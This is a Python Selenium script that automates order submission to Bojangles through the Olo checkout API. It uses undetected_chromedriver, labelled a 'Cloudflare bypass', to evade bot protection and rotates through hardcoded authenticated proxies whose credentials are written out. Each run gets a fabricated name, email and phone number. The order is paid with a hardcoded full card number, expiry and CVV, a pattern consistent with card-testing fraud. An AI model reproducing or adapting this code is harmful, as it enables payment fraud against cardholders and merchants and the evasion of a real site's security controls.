import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random
import time
import json

# --- VALIDATED USA PROXIES ONLY (7 Working Proxies) ---
usa_proxy_list = [
    "iicwyzxj:43fcbrangis0@142.111.48.253:7030",  # Los Angeles, California
    "iicwyzxj:43fcbrangis0@23.95.150.145:6114",   # Buffalo, New York
    "iicwyzxj:43fcbrangis0@198.23.239.134:6540",  # Buffalo, New York
    "iicwyzxj:43fcbrangis0@107.172.163.27:6543",  # Buffalo, New York
    "iicwyzxj:43fcbrangis0@216.10.27.159:6837",   # Los Angeles, California
    "iicwyzxj:43fcbrangis0@23.26.71.145:5628",    # Orem, Utah
    "iicwyzxj:43fcbrangis0@23.27.208.120:5830",   # Reston, Virginia
]

# --- Pre-defined lists for rotating user data ---
first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
email_domains = ["@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com"]

def get_random_phone_number():
    """Generates a random US-formatted phone number."""
    return f"{random.randint(201, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"

def setup_driver_with_proxy(proxy_string):
    """Setup undetected Chrome driver with proxy"""
    options = uc.ChromeOptions()
    
    # Parse proxy
    proxy_parts = proxy_string.split('@')
    auth = proxy_parts[0]
    host_port = proxy_parts[1]
    
    # Add proxy extension for authentication
    options.add_argument(f'--proxy-server=http://{host_port}')
    options.add_argument('--headless=new')  # Run in headless mode
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    # Random user agent
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    ]
    options.add_argument(f'user-agent={random.choice(user_agents)}')
    
    driver = uc.Chrome(options=options, version_main=None)
    return driver, auth

def process_order_with_selenium():
    """Process order using Selenium with Cloudflare bypass"""
    driver = None
    
    try:
        # Select random proxy
        proxy_choice = random.choice(usa_proxy_list)
        print(f"[*] Using USA Proxy: {proxy_choice.split('@')[1]}")
        
        # Setup driver
        print("[*] Setting up browser...")
        driver, proxy_auth = setup_driver_with_proxy(proxy_choice)
        
        # Generate random user data
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10,99)}{random.choice(email_domains)}"
        phone_number = get_random_phone_number()
        
        print(f"\n[*] Using Rotated User Data:")
        print(f"    - Name: {first_name} {last_name}")
        print(f"    - Email: {email}")
        print(f"    - Phone: {phone_number}")
        
        # Step 1: Get access token
        order_id = "def67214-7132-4e25-a8ea-7a18923f734f"
        token_url = f'https://www.bojangles.com/api/v1/orders/{order_id}/token'
        
        print(f"\n[*] Fetching access token via browser...")
        driver.get(token_url)
        
        # Wait for page to load and get response
        time.sleep(3)
        page_source = driver.page_source
        
        # Extract JSON from page
        try:
            # Find JSON in page source
            if 'accesstoken' in page_source.lower():
                import re
                json_match = re.search(r'\{[^}]*"accesstoken"[^}]*\}', page_source, re.IGNORECASE)
                if json_match:
                    token_data = json.loads(json_match.group())
                    access_token = token_data.get('accesstoken') or token_data.get('accessToken')
                else:
                    # Try to get from pre tag
                    pre_element = driver.find_element(By.TAG_NAME, "pre")
                    token_data = json.loads(pre_element.text)
                    access_token = token_data.get('accesstoken') or token_data.get('accessToken')
                
                print(f"[+] Successfully retrieved Access Token: {access_token}")
            else:
                print("[!] Could not find access token in response")
                print(f"Page source: {page_source[:500]}")
                return
        except Exception as e:
            print(f"[!] Error parsing token: {e}")
            return
        
        # Step 2: Submit order using JavaScript execution
        print("\n[*] Submitting order via browser...")
        submit_url = f'https://www.olocheckout.com/api/baskets/{order_id}/submit'
        
        # Prepare JSON data
        json_data = {
            'brandAccessId': 'pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn',
            'accessToken': access_token,
            'firstName': first_name,
            'lastName': last_name,
            'emailAddress': email,
            'contactNumber': phone_number,
            'customData': [],
            'billingAccounts': [{
                'billingFields': [],
                'billingMethod': 'creditcard',
                'expiryYear': '2028',
                'expiryMonth': '10',
                'zip': '10080',
                'saveOnFile': False,
                'amount': 11.49,
                'tipPortion': 0,
                'cardNumber': '4677845104934858',
                'cvv': '548',
            }],
            'bookingUserOptIntoSms': False,
            'createOloAccount': False,
        }
        
        # Use JavaScript to make POST request
        script = f"""
        var callback = arguments[arguments.length - 1];
        
        fetch('{submit_url}', {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'x-olo-domain-origin': 'https://www.bojangles.com',
                'x-olo-request': '1'
            }},
            body: JSON.stringify({json.dumps(json_data)})
        }})
        .then(response => response.text().then(text => ({{
            status: response.status,
            body: text
        }})))
        .then(data => callback(data))
        .catch(error => callback({{error: error.toString()}}));
        """
        
        # Navigate to olocheckout.com first to set proper origin
        driver.get("https://www.olocheckout.com")
        time.sleep(5)  # Wait for Cloudflare challenge
        
        # Check if Cloudflare blocked us
        if "cloudflare" in driver.page_source.lower() and "blocked" in driver.page_source.lower():
            print("\n[-] Cloudflare detected and blocked the browser")
            print("[-] This proxy might be blacklisted")
            print("[!] Try running the script again with a different proxy")
            return
        
        # Execute the POST request
        result = driver.execute_async_script(script)
        
        print("\n" + "="*70)
        print("FINAL RESPONSE")
        print("="*70)
        
        if 'error' in result:
            print(f"[!] Error: {result['error']}")
        else:
            print(f"Status Code: {result['status']}")
            print(f"\nResponse Body:")
            print(result['body'])
            
            if result['status'] == 200:
                print("\n[+] SUCCESS! Order submitted successfully!")
            elif result['status'] == 403:
                print("\n[-] Still blocked by Cloudflare")
        
        print("="*70)
        
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        if driver:
            print("\n[*] Closing browser...")
            driver.quit()

if __name__ == "__main__":
    print("="*70)
    print("BOJANGLES ORDER AUTOMATION (SELENIUM + CLOUDFLARE BYPASS)")
    print("Using 7 Validated USA Proxies")
    print("="*70)
    process_order_with_selenium()
